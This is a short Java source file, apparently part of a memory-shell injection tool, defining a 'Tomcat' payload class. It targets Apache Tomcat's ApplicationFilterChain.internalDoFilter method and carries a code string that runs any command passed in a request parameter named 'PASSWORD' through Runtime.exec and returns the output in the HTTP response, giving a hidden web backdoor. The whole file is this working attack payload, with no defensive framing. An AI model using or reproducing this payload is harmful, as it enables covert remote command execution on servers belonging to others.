package com.company.payloads;

import com.company.Config;

public class Tomcat extends Config {
    public static String jvmKeyword = "catalina";
    public Tomcat() {
        className = "org.apache.catalina.core.ApplicationFilterChain";
        methodName = "internalDoFilter";
        code = "String cmd = request.getParameter(\"PASSWORD\");\n" +
                "if (cmd != null) {\n" +
                "Process process = Runtime.getRuntime().exec(cmd);\n" +
                "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                "new java.io.InputStreamReader(process.getInputStream()));\n" +
                "StringBuilder stringBuilder = new StringBuilder();\n" +
                "String line;\n" +
                "while ((line = bufferedReader.readLine()) != null) {\n" +
                "stringBuilder.append(line + '\\n');\n" +
                "}\n" +
                "response.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                "response.getOutputStream().flush();\n" +
                "response.getOutputStream().close();\n" +
                "}";
    }
}
